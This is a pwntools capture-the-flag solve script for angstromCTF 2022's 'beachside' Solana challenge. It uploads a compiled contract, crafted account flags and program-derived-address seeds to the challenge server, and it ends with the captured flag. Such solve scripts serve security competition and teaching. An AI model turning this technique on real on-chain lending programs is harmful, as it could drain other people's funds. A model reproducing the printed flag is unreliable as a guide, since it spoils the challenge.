#!/usr/bin/env python3
from pwn import *
from solana import *

from solana.publickey import PublicKey

HOST, PORT = "challs.actf.co 31229".split()

class Pubkey(object):
    
    def __init__(self: object, pubkey: bytes, seed: int = 0) -> object:
        self.pubkey = pubkey.decode()
        self.seed = p8(seed)

filename = (
        "/home/h4ck1t/Desktop/CTFs/angstromCTF/2022/pwn/"
        "beachside/example-helloworld/dist/program/helloworld.so"
)

def initialize_pubkeys() -> dict:
    return {
        "system": Pubkey(b"11111111111111111111111111111111"),
        "clock": Pubkey(b"SysvarC1ock11111111111111111111111111111111")
    }

def generate_pubkeys(program_pubkey: str, solve_pubkey: str) -> dict:
    vault_pubkey, vault_seed = PublicKey.find_program_address([b"vault"], PublicKey(program_pubkey))
    lending_pubkey, lending_seed = PublicKey.find_program_address([], PublicKey(program_pubkey))
    solfire_pubkey, solfire_seed = PublicKey.find_program_address([], PublicKey(solve_pubkey))

    return {
        "vault": Pubkey(vault_pubkey.to_base58(), vault_seed),
        "lending_data": Pubkey(lending_pubkey.to_base58(), lending_seed),
        "solfire": Pubkey(solfire_pubkey.to_base58(), solfire_seed)
    }


def start() -> object:
    if args.REMOTE:
        return remote(HOST, PORT)
    return remote('localhost', 8080)

data = b""
with open(filename, "rb") as contract:
    data = contract.read()

itob = lambda _: str(_).encode()

io = start()

log.info("#0x0: sending smart contract")
io.sendlineafter(b"program len:", itob(len(data)))
io.send(data)

log.info("#0x1: receiving public keys")
io.recvline()
pubkeys = initialize_pubkeys()
for i in range(3):
    name = io.recvuntil(b" pubkey: ", drop=True).decode()
    pubkey = io.recvline().strip()
    pubkeys[name] = Pubkey(pubkey)
pubkeys.update(generate_pubkeys(pubkeys["program"].pubkey, pubkeys["solve"].pubkey))

log.info("#0x2: preparing accounts")
accounts = list()

account_names = {
    "system": "r",
    "clock": "r",
    "user": "ws",
    "vault": "w",
    "program": "r",
    "lending_data": "w",
    "solve": "r"
}

for name in account_names:
    accounts.append((account_names[name], pubkeys[name].pubkey))

accounts_len = len(accounts)
io.sendlineafter(b"accounts:", itob(accounts_len))

for i in range(accounts_len):
    io.sendline(f"{accounts[i][0]} {accounts[i][1]}".encode())

log.info("#0x3: preparing instruction")
instr = pubkeys["vault"].seed + pubkeys["lending_data"].seed + pubkeys["solfire"].seed
instr_len = len(instr)
io.sendlineafter(b"len:", itob(instr_len))
io.sendline(instr)

io.interactive()

# actf{call_some_place_par4d1se_kiss_it_g0odbye_c80048f1e092}
